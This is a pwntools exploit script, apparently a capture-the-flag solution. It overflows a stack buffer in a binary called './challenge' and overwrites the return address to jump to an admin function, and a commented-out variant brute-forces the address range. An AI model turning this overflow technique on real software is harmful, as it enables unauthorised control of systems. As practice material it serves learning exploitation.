from pwn import *
import sys

# Buffer size is not 16 on the server
ADDR_SIZE = 4
LOCAL_BUFF_SIZE = 32

# GDB script
gdb_script = """
break 27
break 29
continue
"""

# Prepare program
exe = "./challenge"
elf = context.binary = ELF(exe, checksec=True)
context.log_level = "DEBUG"


def start(argv=[], *a, **kwargs):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdb_script, *a, **kwargs)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
    else:
        return process([exe] + argv, *a, **kwargs)


# Run the debugger

buffsize = LOCAL_BUFF_SIZE
jumpToAdmin = 0x0804934A
memJump = jumpToAdmin.to_bytes(4, "little")

# exit(1)
io = start()
io.recvline(2)


try:
    payload = LOCAL_BUFF_SIZE * b"A" + memJump
    info(
        f"Jumping to 0x{memJump} in little endian form or big endian{jumpToAdmin.to_bytes(4, "big")}"
    )
    io.sendline(payload)
    result = io.recvall()
    print(result)
except Exception as e:
    print(e)
# ------------------------------------------


# sys.stdout.buffer.write(16 * b"A" + b"\xff")
# from pwn import *
# import sys

# # Buffer size is not 16 on the server
# ADDR_SIZE = 4
# LOCAL_BUFF_SIZE = 32

# # GDB script
# gdb_script = """
# break 27
# break 29
# continue
# """

# # Prepare program
# exe = "./challenge"
# elf = context.binary = ELF(exe, checksec=True)
# context.log_level = "DEBUG"


# def start(argv=[], *a, **kwargs):
#     if args.GDB:
#         return gdb.debug([exe] + argv, gdbscript=gdb_script, *a, **kwargs)
#     elif args.REMOTE:
#         return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
#     else:
#         return process([exe] + argv, *a, **kwargs)


# # Run the debugger

# buffsize = LOCAL_BUFF_SIZE
# jumpToAdmin = 0x0804934A
# memJump = jumpToAdmin.to_bytes(4, "little")
# base = 0x0804300


# try:
#     currAddr = base
#     for x in range(0, 0xFF):
#         io = start()
#         # io.recvline(2)
#         payload = LOCAL_BUFF_SIZE * b"A" + p32(currAddr, "little")
#         info(
#             f"Jumping to 0x{currAddr} in little endian form or big endian{currAddr.to_bytes(4, "big")}"
#         )
#         io.sendline(payload)
#         result = io.recvall()
#         print(result)
# except Exception as e:
#     print(e)
# # Add the canary below but into little endian form
